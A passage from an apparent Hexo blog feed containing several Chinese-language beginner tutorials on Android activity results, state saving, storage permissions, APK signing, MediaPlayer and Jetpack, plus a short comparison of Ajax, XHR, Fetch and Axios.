<p>这就是使用 <code>registerForActivityResult()</code> 方法来代替 <code>startActivityForResult()</code> 的详细说明和示范。请注意，这个新的 API 仅适用于 Android 11 及更高版本，如果你的目标是更早版本的 Android，则需要考虑其他替代方案。</p>
<ul>
<li>startActivityForResult()<br>在android10之前任然是使用这个方法的，所以该学还得学。<br>使用：<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">button1.setOnClickListenner&#123;</span><br><span class="line">	<span class="type">val</span> <span class="variable">intent</span> <span class="operator">=</span> Intent(<span class="built_in">this</span>,SecondActvity::class.java)</span><br><span class="line">	startActivityForResult(intent,<span class="number">1</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
被执行的类放入数据：<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">SecondActivity</span>&#123;</span><br><span class="line">	...</span><br><span class="line">	<span class="type">val</span> <span class="variable">intent</span> <span class="operator">=</span> Intent()</span><br><span class="line">	intent.putExtra(<span class="string">&quot;data_return&quot;</span>,<span class="string">&quot;Hello FirstActivity&quot;</span>)</span><br><span class="line">	setResult(RESUILT_OK,intent)</span><br><span class="line">	finish()</span><br><span class="line">	<span class="comment">//手动销毁activity</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
回调函数：<br>因为使用的是startActiityForResult()方法，因此，SecondActivity被销毁后，会回调上一个Activity的onActivityResult()方法，因此我们需要重写这个方法来获得数据<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">override fun <span class="title function_">onActivityResult</span><span class="params">(requestCode:Int, resultCode:Int, data: Intent?)</span>&#123;</span><br><span class="line">	<span class="built_in">super</span>.onActivityResult(requestCode,resultCode,data)</span><br><span class="line">	<span class="keyword">when</span>(requestCode)&#123;</span><br><span class="line">		<span class="number">1</span> - &gt; <span class="keyword">if</span>(resultCode == RESULT_OK)&#123;</span><br><span class="line">		<span class="type">val</span> <span class="variable">returnedData</span> <span class="operator">=</span> data?.getStringExtra(<span class="string">&quot;data_return&quot;</span>)</span><br><span class="line">		Log.d(<span class="string">&quot;FirstActivity&quot;</span>,<span class="string">&quot;returned data is $returnedData&quot;</span>)</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
onActivityResult()方法有三个参数，第一个<code>requestCode</code>,即我们请就是传入的请求码。第二个<code>resultCode</code>即返回时的处理结果，第三个参数<code>data</code>即携带数据的Intent。</li>
</ul>
]]></content>
      <categories>
        <category>Android入门</category>
      </categories>
  </entry>
  <entry>
    <title>Activity被回收</title>
    <url>/posts/4dca68be/</url>
    <content><![CDATA[<p>一般情况下，只有activity被销毁后才hi被回收。可是，当系统内存不足时，他会将处于停止状态的activity也回收了。<br>如果停止状态的activity没被回收，那么再次启动时，将会执行<code>onRestart()</code>方法，然后恢复数据，但是如果被回收后，他会执行<code>onCreate()</code>方法，也就导致，如果这个activity有文本输入框的话，这些数据都会直接消失。</p>
<p>因此为了解决这个问题，Activity提供了一个<code>onSaveInstanceState()</code>回调方法。他在回收前一点会调用该方法。该方法需要一个Bundle参数，也可以用put之类的保存键值对参数。如下代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">override fun <span class="title function_">onSaveInstanceState</span><span class="params">(outState: Bundle)</span>&#123;</span><br><span class="line">	<span class="built_in">super</span>.onSaveInstanceState(outState)</span><br><span class="line">	<span class="type">val</span> <span class="variable">tempData</span> <span class="operator">=</span> <span class="string">&quot;Something you just typed&quot;</span></span><br><span class="line">	outState.putString(<span class="string">&quot;data_key&quot;</span>,tempData)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>数据已经保存了，然后恢复的话，需要修改onCreate()的内容</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">override fun <span class="title function_">onCreate</span><span class="params">(savedInstanceState:Bundle?)</span>&#123;</span><br><span class="line">	<span class="built_in">super</span>.onCreate(savedInstanceState)</span><br><span class="line">	Log.d(tag,<span class="string">&quot;On Create&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span>(savedInstanceState != <span class="literal">null</span>)&#123;</span><br><span class="line">		<span class="type">val</span> <span class="variable">tempDta</span> <span class="operator">=</span> saveInstanceState.getString(<span class="string">&quot;data_key&quot;</span>)</span><br><span class="line">		Log.d(tag,teamData)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Android入门</category>
      </categories>
  </entry>
  <entry>
    <title>Ajax、XHR、Fetch、Axios 关键图解</title>
    <url>/posts/c0b28004/</url>
    <content><![CDATA[<p>关键图解<br><img src="http://memos.zfx-t.top/o/r/36/41d7898c-b8f2-4c13-9228-21a9d88c3a7f/1682094605_image.png" alt="image"></p>
<h1 id="Ajax"><a href="#Ajax" class="headerlink" title="Ajax"></a>Ajax</h1><p>全称（Asynchronous JavaScript And XML）</p>
<blockquote>
<p>Ajax 是一个技术统称，是一个概念模型，它囊括了很多技术，并不特指某一技术，它很重要的特性之一就是让页面实现局部刷新。<br>他可以局部刷新页面，不用重载整个页面。</p>
</blockquote>
<h2 id="XHR"><a href="#XHR" class="headerlink" title="XHR"></a>XHR</h2><p>XHR(XmlHttpRequest)是一种用来实现Ajax的方法<br>示例：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">function</span> <span class="title function_">ajax</span>(<span class="params">url</span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="keyword">const</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      xhr.<span class="title function_">open</span>(<span class="string">&quot;get&quot;</span>, url, <span class="literal">false</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      xhr.<span class="property">onreadystatechange</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="comment">// 异步回调函数</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="keyword">if</span> (xhr.<span class="property">readyState</span> === <span class="number">4</span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">          <span class="keyword">if</span> (xhr.<span class="property">status</span> === <span class="number">200</span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="variable language_">console</span>.<span class="title function_">info</span>(<span class="string">&quot;响应结果&quot;</span>, xhr.<span class="property">response</span>)</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">          &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      xhr.<span class="title function_">send</span>(<span class="literal">null</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="title function_">ajax</span>(<span class="string">&#x27;https://smallpig.site/api/category/getCategory&#x27;</span>)</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure>
<p><em>注意</em>：我们使用这种方式实现网络请求时，如果请求内部又包含请求，以此循环，就会出现回调地狱，这也是一个诟病，后来才催生了更加优雅的请求方式。</p>
<h2 id="Fetch"><a href="#Fetch" class="headerlink" title="Fetch"></a>Fetch</h2><blockquote>
<p>Fetch 是一个 API，它是真实存在的，它是基于 promise 的。</p>
</blockquote>
<ul>
<li>使用 promise，不使用回调函数。</li>
<li>采用模块化设计，比如 rep、res 等对象分散开来，比较友好。</li>
<li>通过数据流对象处理数据，可以提高网站性能。<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">function</span> <span class="title function_">ajaxFetch</span>(<span class="params">url</span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="title function_">fetch</span>(url).<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span> res.<span class="title function_">json</span>()).<span class="title function_">then</span>(<span class="function"><span class="params">data</span> =&gt;</span> &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="variable language_">console</span>.<span class="title function_">info</span>(data)</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      &#125;)</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="title function_">ajaxFetch</span>(<span class="string">&#x27;https://smallpig.site/api/category/getCategory&#x27;</span>)</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="Axois"><a href="#Axois" class="headerlink" title="Axois"></a>Axois</h2><ul>
<li>他是一个封装库，是基于XHR来实现的。</li>
<li>从浏览器中创建 XMLHttpRequests</li>
<li>从 node.js 创建 http 请求</li>
<li>支持 Promise API（异步请求时会返回Promise）</li>
<li>拦截请求和响应</li>
<li>转换请求数据和响应数据</li>
<li>取消请求</li>
<li>自动转换 JSON 数据</li>
<li>客户端支持防御 XSRF<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 发送 POST 请求</span></span><br><span class="line"><span class="title function_">axios</span>(&#123;</span><br><span class="line">    <span class="attr">method</span>: <span class="string">&#x27;post&#x27;</span>,</span><br><span class="line">    <span class="attr">url</span>: <span class="string">&#x27;/user/12345&#x27;</span>,</span><br><span class="line">    <span class="attr">data</span>: &#123;</span><br><span class="line">        <span class="attr">firstName</span>: <span class="string">&#x27;Fred&#x27;</span>,</span><br><span class="line">        <span class="attr">lastName</span>: <span class="string">&#x27;Flintstone&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<blockquote>
<p>引用自<a href="https://zhuanlan.zhihu.com/p/497865043">知乎</a></p>
</blockquote>
</li>
</ul>
]]></content>
      <tags>
        <tag>vue</tag>
        <tag>JS</tag>
      </tags>
  </entry>
  <entry>
    <title>Android 13（API 33）读写SD卡权限的调整适配</title>
    <url>/posts/9283408d/</url>
    <content><![CDATA[<h2 id="Android-13（API-33）读写SD卡权限的调整适配"><a href="#Android-13（API-33）读写SD卡权限的调整适配" class="headerlink" title="Android 13（API 33）读写SD卡权限的调整适配"></a>Android 13（API 33）读写SD卡权限的调整适配</h2><p>在Android13前读取SDcard 的内容只需要一个权限：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">android.permission.READ_EXTERNAL_STORAGE</span><br></pre></td></tr></table></figure>
<p>但是在Android 13以后这个权限被细化成了三个：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">READ_MEDIA_AUDIO</span> <span class="operator">=</span> <span class="string">&quot;android.permission.READ_MEDIA_AUDIO&quot;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">READ_MEDIA_IMAGES</span> <span class="operator">=</span> <span class="string">&quot;android.permission.READ_MEDIA_IMAGES&quot;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">READ_MEDIA_VIDEO</span> <span class="operator">=</span> <span class="string">&quot;android.permission.READ_MEDIA_VIDEO&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>如果是升级Android13之前就已经具有读写SDK的权限，那么升级到13之后，自己具有上述三个权限。</p>
<p>如果是升级Android13之后新装的应用，并且targetSDK小于33，则申请READ_EXTERNAL_STORAGE权限时，会自动转化为对上述三个权限的申请，权限申请框只一个<br>如果是升级Android13之后新装的应用，并且targetSDK大于等于33，则申请READ_EXTERNAL_STORAGE权限时会自动拒绝（同理WRITE_EXTERNAL_STORAGE也是一样）。必须申请上面三个权限才可以。</p>
]]></content>
      <categories>
        <category>Android入门</category>
      </categories>
  </entry>
  <entry>
    <title>Android Studio 打包APK</title>
    <url>/posts/f5b9a2a4/</url>
    <content><![CDATA[<ol>
<li><p>当你开发完一个App项目后，你所运行生成的都是debug的安装包，也就是无法正常安装，只能在开发者模式下调试使用。<br>![](<a href="https://image.zfxt.top/hexo-blog/Android">https://image.zfxt.top/hexo-blog/Android</a> Studio 打包APK-2023-10-20-38-51.png)</p>
<blockquote>
<p>如果要查看这些隐藏的文件夹，需要打开设置![](<a href="https://image.zfxt.top/hexo-blog/Android">https://image.zfxt.top/hexo-blog/Android</a> Studio 打包APK-2023-10-20-40-04.png)</p>
</blockquote>
</li>
<li><p>打包过程，进入build<br>![](<a href="https://image.zfxt.top/hexo-blog/Android">https://image.zfxt.top/hexo-blog/Android</a> Studio 打包APK-2023-10-04-49-19.png)<br>![](<a href="https://image.zfxt.top/hexo-blog/Android">https://image.zfxt.top/hexo-blog/Android</a> Studio 打包APK-2023-10-04-08-07.png)<br>![](<a href="https://image.zfxt.top/hexo-blog/Android">https://image.zfxt.top/hexo-blog/Android</a> Studio 打包APK-2023-10-22-44-03.png)<br>这里需要一个商店的key，因为没有，所以创建一个新的，点击Create new…<br>![](<a href="https://image.zfxt.top/hexo-blog/Android">https://image.zfxt.top/hexo-blog/Android</a> Studio 打包APK-2023-10-22-57-47.png)<br>首先指明生成的jks文件的路径，点击这个文件夹图标。<br>![](<a href="https://image.zfxt.top/hexo-blog/Android">https://image.zfxt.top/hexo-blog/Android</a> Studio 打包APK-2023-10-18-56-53.png)<br>我个人习惯放在D盘的APK目录下，然后命名jks的名称为GenerateAPK，<br>然后点击OK。<br>![](<a href="https://image.zfxt.top/hexo-blog/Android">https://image.zfxt.top/hexo-blog/Android</a> Studio 打包APK-2023-10-22-37-04.png)<br>然后输入这个jks和别名的一些相关信息，上方的商店密码和别名密码可以设置为一样的，这样便于记忆，只不过安全系数就降低了。我上面设置的是123456，信息都设置好了之后，点击OK。</p>
</li>
</ol>
<p>![](<a href="https://image.zfxt.top/hexo-blog/Android">https://image.zfxt.top/hexo-blog/Android</a> Studio 打包APK-2023-10-04-26-34.png)</p>
<p>这里勾选上记住密码。<br>当你看到屏幕的右下角出现这个提示时，说明你的APK已经生成了，你可以在你的app下看到多了一个release的文件夹，里面就是app-release.apk包，下面你可以复制发到手机上，然后下载，手机上是可以安装的。</p>
<blockquote>
<p>该文章引用自(CSDN)[<a href="https://blog.csdn.net/qq_38436214/article/details/112288954]">https://blog.csdn.net/qq_38436214/article/details/112288954]</a></p>
</blockquote>
]]></content>
      <categories>
        <category>Android入门</category>
      </categories>
      <tags>
        <tag>APK打包</tag>
        <tag>android Studio</tag>
      </tags>
  </entry>
  <entry>
    <title>Android MediaPlayer</title>
    <url>/posts/e3e66d1f/</url>
    <content><![CDATA[<p><strong>这是MediaPlayer的关键生命周期，这张图是关键，他可以帮你很好的理解如何使用MediaPlayer</strong><br>![](<a href="https://image.zfxt.top/hexo-blog/Android">https://image.zfxt.top/hexo-blog/Android</a> MediaPlayer-2023-12-23-24-02.png)</p>
<p>MediaPlayer的常用方法</p>
<p>| Public Methods |<br>| — | — |<br>| static MediaPlayer | create(Context context, Uri uri, SurfaceHolder holder)指定从资源ID对应的资源文件中来装载音乐文件，同时指定了SurfaceHolder对象并返回MediaPlyaer对象。 |<br>| static MediaPlayer | create(Context context, int resid)指定从资源ID对应的资源文件中来装载音乐文件，并返回新创建的MediaPlyaer对象。 |<br>| static MediaPlayer | create(Context context, Uri uri)从指定Uri装在音频文件，并返回新创建的MediaPlayer对象。 |<br>| int | getCurrentPosition()获取当前播放的位置。 |<br>| int | getDuration()获取音频的时长。 |<br>| int | getVideoHeight()获取视频的高度。 |<br>| int | getVideoWidth()获取视频的宽度。 |<br>| boolean | isLooping()判断MediaPlayer是否正在循环播放。 |<br>| boolean | isPlaying()判断MediaPlayer是否正在播放。 |<br>| void | pause()暂停播放。 |<br>| void | prepare()准备播放（装载音频），调用此方法会使MediaPlayer进入Prepared状态。 |<br>| void | prepareAsync()准备播放异步音频。 |<br>| void | release()释放媒体资源。 |<br>| void | reset()重置MediaPlayer进入未初始化状态。 |<br>| void | seekTo(int msec)寻找指定的时间位置。 |<br>| void | setAudioStreamType(int streamtype)设置音频流的类型。 |<br>| void | setDataSource(String path)指定装载path路径所代表的文件。 |<br>| void | setDataSource(Context context, Uri uri, Map&lt;String, String headers)指定装载uri所代表的文件。 |<br>| void | setDataSource(Context context, Uri uri)指定装载uri所代表的文件。 |<br>| void | setDataSource(FileDescriptor fd, long offset, long length)指定装载fd所代表的文件中从offset开始长度为length的文件内容。 |<br>| void | setDataSource(FileDescriptor fd)指定装载fd所代表的文件。 |<br>| void | setDisplay(SurfaceHolder sh)设置显示方式。 |<br>| void | setLooping(boolean looping)设置是否循环播放。 |<br>| void | setNextMediaPlayer(MediaPlayer next)设置当前流媒体播放完毕,下一个播放的MediaPlayer。 |<br>| void | setOnBufferingUpdateListener(MediaPlayer.OnBufferingUpdateListener listener)注册一个回调函数,在网络视频流缓冲变化时调用。 |<br>| void | setOnCompletionListener(MediaPlayer.OnCompletionListener listener)为Media Player的播放完成事件绑定事件监听器。 |<br>| void | setOnErrorListener(MediaPlayer.OnErrorListener listener)为MediaPlayer的播放错误事件绑定事件监听器。 |<br>| void | setOnPreparedListener(MediaPlayer.OnPreparedListener listener)当MediaPlayer调用prepare()方法时触发该监听器。 |<br>| void | setOnSeekCompleteListener(MediaPlayer.OnSeekCompleteListener listener)当MediaPlayer调用seek()方法时触发该监听器。 |<br>| void | setOnVideoSizeChangedListener(MediaPlayer.OnVideoSizeChangedListener listener)注册一个用于监听视频大小改变的监听器。 |<br>| void | setScreenOnWhilePlaying(boolean screenOn)置是否使用SurfaceHolder来显示。 |<br>| void | setSurface(Surface surface)设置Surface。 |<br>| void | setVideoScalingMode(int mode)设置视频缩放的模式。 |<br>| void | setVolume(float leftVolume, float rightVolume)设置播放器的音量。 |<br>| void | setWakeMode(Context context, int mode)为MediaPlayer设置低级电源管理行为。. |<br>| void | start()开始或恢复播放。 |<br>| void | stop()停止播放。 |</p>
<p>这是我的写法：</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AudioPlayerImpl</span>(</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">val</span> app: Application</span><br><span class="line">) : AudioPlayer &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">var</span> _mediaPlayer: MediaPlayer? = <span class="literal">null</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">override</span> <span class="function"><span class="keyword">fun</span> <span class="title">play</span><span class="params">(uri: <span class="type">String</span>?)</span></span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (_mediaPlayer == <span class="literal">null</span>) &#123;</span><br><span class="line">            _mediaPlayer = MediaPlayer().apply &#123;</span><br><span class="line">                setDataSource(app, android.net.Uri.parse(uri))</span><br><span class="line">                prepare()</span><br><span class="line">                start()</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            uri?.let &#123;</span><br><span class="line">                release()</span><br><span class="line">                _mediaPlayer = MediaPlayer().apply &#123;</span><br><span class="line"></span><br><span class="line">                    setDataSource(app, android.net.Uri.parse(uri))</span><br><span class="line">                    prepare()</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            _mediaPlayer?.apply &#123;</span><br><span class="line"></span><br><span class="line">                start()</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">override</span> <span class="function"><span class="keyword">fun</span> <span class="title">pause</span><span class="params">()</span></span> &#123;</span><br><span class="line">        _mediaPlayer?.pause()</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">override</span> <span class="function"><span class="keyword">fun</span> <span class="title">release</span><span class="params">()</span></span> &#123;</span><br><span class="line">        _mediaPlayer?.stop()</span><br><span class="line">        _mediaPlayer?.release()</span><br><span class="line">        _mediaPlayer = <span class="literal">null</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>引用自<a href="https://blog.csdn.net/Jason_Julie/article/details/115549602">csdn</a></p>
</blockquote>
]]></content>
      <categories>
        <category>Android入门</category>
      </categories>
      <tags>
        <tag>MediaPlayer</tag>
      </tags>
  </entry>
  <entry>
    <title>Android 中 Bitmap 和 Drawable 相互转换的方法</title>
    <url>/posts/b77305e8/</url>
    <content><![CDATA[<ul>
<li>drawable转为bitmap<br>其中的appcontext可以是activity的context属性也可以是全局的appContext<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">val</span> music_default_art = BitmapFactory.decodeResource(appContext.resources,R.drawable.music_default)</span><br></pre></td></tr></table></figure></li>
<li>bitmap转为drawable<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">val</span> drawable =  BitmapDrawable(bmp)</span><br></pre></td></tr></table></figure></li>
</ul>
]]></content>
      <categories>
        <category>Android入门</category>
      </categories>
  </entry>
  <entry>
    <title>Android(Jetpack)</title>
    <url>/posts/1941ba40/</url>
    <content><![CDATA[<h1 id="Jetpack"><a href="#Jetpack" class="headerlink" title="Jetpack"></a>Jetpack</h1><p>Jetpack是一个开发组件工具集，它的主要目的是帮助我们编写出更加简洁的代码，并简化我们的开发过程。Jetpack中的组件有一个特点，它们大部分不依赖于任何Android系统版本，这意味着这些组件通常是定义在AndroidX库当中的，并且拥有非常好的向下兼容性。</p>
<h1 id="MVVM架构"><a href="#MVVM架构" class="headerlink" title="MVVM架构"></a>MVVM架构</h1><h2 id="ViewModel"><a href="#ViewModel" class="headerlink" title="ViewModel"></a>ViewModel</h2><p>ViewModel是可以帮助Activity分担一部分工作，它是专门用于存放与界面相关的数据的。<br>只要是界面上能看得到的数据，它的相关变量都应该存放在ViewModel中，而不是Activity中，这样可以在一定程度上减少Activity中的逻辑。<br>ViewModel还有一个非常重要的特性。我们都知道，当手机发生横竖屏旋转的时候，Activity会被重新创建，同时存放在Activity中的数据也会丢失。而ViewModel的生命周期和Activity不同，它可以保证在手机屏幕发生旋转的时候不会被重新创建，只有当Activity退出的时候才会跟着Activity一起销毁。<br><img src="https://image.zfxt.top/hexo-blog/Android(Jetpack)-2023-08-17-57-44.png"><br><strong>导入外部依赖</strong>：<code>implementation &quot;androidx.lifecycle:lifecycle-extensions:2.2.0&quot;</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MainViewModel</span> : ViewModel() &#123;</span><br><span class="line">    <span class="type">var</span> <span class="variable">counter</span> <span class="operator">=</span> <span class="number">0</span></span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line"><span class="comment">//Activity中</span></span><br><span class="line"> viewModel = ViewModelProvider(<span class="built_in">this</span>)[MainViewModel::class.java]</span><br><span class="line">        binding.apply &#123;</span><br><span class="line">            plusOneBtn.setOnClickListener &#123;</span><br><span class="line">                viewModel.counter++</span><br><span class="line">                refreshCounter()</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> fun <span class="title function_">refreshCounter</span><span class="params">()</span> &#123;</span><br><span class="line">        binding.infoText.text = viewModel.counter.toString()</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>这一段的一个重点：我们不是创建一个viewModel实例，而是通过ViewModelProvider来获取ViewModel的实例.因为ViewModel有其独立的生命周期，并且其生命周期要长于Activity。</p>
<h3 id="向viewModel传递参数"><a href="#向viewModel传递参数" class="headerlink" title="向viewModel传递参数"></a>向viewModel传递参数</h3><p>由于所有ViewModel的实例都是通过ViewModelProvider来获取的，因此我们没有任何地方可以向ViewModel的构造函数中传递参数。只能借助<code>ViewModelProvider.Factory</code>来实现</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MainViewModel</span>(val countReserved: Int) : ViewModel() &#123;</span><br><span class="line">    <span class="type">var</span> <span class="variable">counter</span> <span class="operator">=</span> countReserved</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MainViewModelFactory</span>(val countReserved: Int) : ViewModelProvider.Factory &#123;</span><br><span class="line">    override fun &lt;T : ViewModel&gt; create(modelClass: Class&lt;T&gt;): T &#123;</span><br><span class="line">        <span class="keyword">return</span> MainViewModel(countReserved) as T</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这样子，ViewModel就可以接收一个参数了，然后通过factory去构建他。<br>为什么这里可以创建了呢？因为create()方法的执行时机和Activity的生命周期无关，所以不会产生之前提到的问题：当activity被销毁后，viewmodel也一起销毁了。<br>使用方法是：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">viewModel = ViewModelProvider(</span><br><span class="line">           <span class="built_in">this</span>,</span><br><span class="line">           MainViewModelFactory(countReserved)</span><br><span class="line">       )[MainViewModel::class.java]</span><br></pre></td></tr></table></figure>
<p>只有通过这种方法创建才能传入参数，并且保证viewModel的声明周期与activity的声明周期相互独立。（这里你也可以使用object继承，而不用单独创建一个工厂类。</p>
<h2 id="Lifecycles"><a href="#Lifecycles" class="headerlink" title="Lifecycles"></a>Lifecycles</h2><p>我们需要能够时刻感知到Activity的生命周期，以便在适当的时候进行相应的逻辑控制。<br>可是而如果要在一个非Activity的类中去感知Activity的生命周期，应该怎么办呢？</p>
<p><code>LifecycleObserver</code>是一个空方法接口，如果想要感知到Activity的生命周期，还得借助额外的注解功能才行.</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Myobserver</span> : LifecycleObserver &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@OnLifecycleEvent(Lifecycle.Event.ON_START)</span></span><br><span class="line">    fun <span class="title function_">activityStart</span><span class="params">()</span> &#123;</span><br><span class="line">        Log.d(<span class="string">&quot;MyObserver&quot;</span>, <span class="string">&quot;activityStart&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@OnLifecycleEvent(Lifecycle.Event.ON_STOP)</span></span><br><span class="line">    fun <span class="title function_">activityStop</span><span class="params">()</span> &#123;</span><br><span class="line">        Log.d(<span class="string">&quot;MyObserver&quot;</span>, <span class="string">&quot;activityStop&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后再Activity的创建中<code>lifecycle.addObserver(MyObserver())</code>将我们构建的类添加进去，他就会接收到生命周期的信息，每当生命周期发生变化，他就会执行方法。<br>但是这样子也只会被动的接收生命周期的改变。无法主动感知生命周期的变化</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyObserver</span>(val lifecycle: Lifecycle) : LifecycleObserver &#123;</span><br><span class="line"> ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>只有把lifecycle对象传递进去，就可以再任意地方调用<code>lifecycle.currentState</code>来主动获取当前的生命周期状态。<br>lifecycle.currentState返回的生命周期状态是一个枚举类型，一共有INITIALIZED、DESTROYED、CREATED、STARTED、RESUMED这5种状态类型<br><img src="https://image.zfxt.top/hexo-blog/Android(Jetpack)-2023-08-06-43-09.png"></p>
<h2 id="LiveData"><a href="#LiveData" class="headerlink" title="LiveData"></a>LiveData</h2><p>它可以包含任何类型的数据，并在数据发生变化的时候通知给观察者。他通常与viewModel一起使用<br>问题：如果ViewModel的内部开启了线程去执行一些耗时逻辑，那么在点击按钮后就立即去获取最新的数据，得到的肯定还是之前的数据。也就是意味着，只有activity能够主动向viewModel索要数据，而不能通过viewModel主动向activity提供数据。而如果我们再veiwModel中存储activity的实例，又会导致生命周期过长，activity的内存占用无法释放。<br>因此可以将数据交由LiveData包装，然后在activity中观察该数它。就可以主动的将变化通知给Activity了。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MainViewModel</span>(val countReserved: Int) : ViewModel() &#123;</span><br><span class="line">    <span class="type">var</span> <span class="variable">counter</span> <span class="operator">=</span> MutableLiveData&lt;Int&gt;()</span><br><span class="line"></span><br><span class="line">    init &#123;</span><br><span class="line">        counter.value = countReserved</span><br><span class="line">    &#125;</span><br><span class="line">     fun <span class="title function_">plusOne</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">val</span> <span class="variable">count</span> <span class="operator">=</span> counter.value ?: <span class="number">0</span></span><br><span class="line">         counter.value = count + <span class="number">1</span></span><br><span class="line">    &#125;</span><br><span class="line">    fun <span class="title function_">clear</span><span class="params">()</span>&#123;</span><br><span class="line">        counter.value = <span class="number">0</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
